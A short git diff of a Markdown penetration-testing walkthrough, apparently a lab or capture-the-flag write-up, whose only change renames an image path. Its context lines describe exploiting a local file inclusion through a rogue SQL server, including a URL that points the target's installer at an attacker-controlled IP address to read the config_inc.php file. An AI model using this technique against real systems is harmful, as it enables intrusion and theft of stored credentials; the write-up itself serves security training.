@@ -102,7 +102,7 @@ This involves using a Rogue SQL server to exploit an LFI:
 
 We just have to visit `install.php?install=3&hostname=192.168.45.191` to run it, and it works!
 
-<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (157) (8).png" alt=""><figcaption></figcaption></figure>
 
 We can use this to read the `config_inc.php` file mentioned earlier:
 
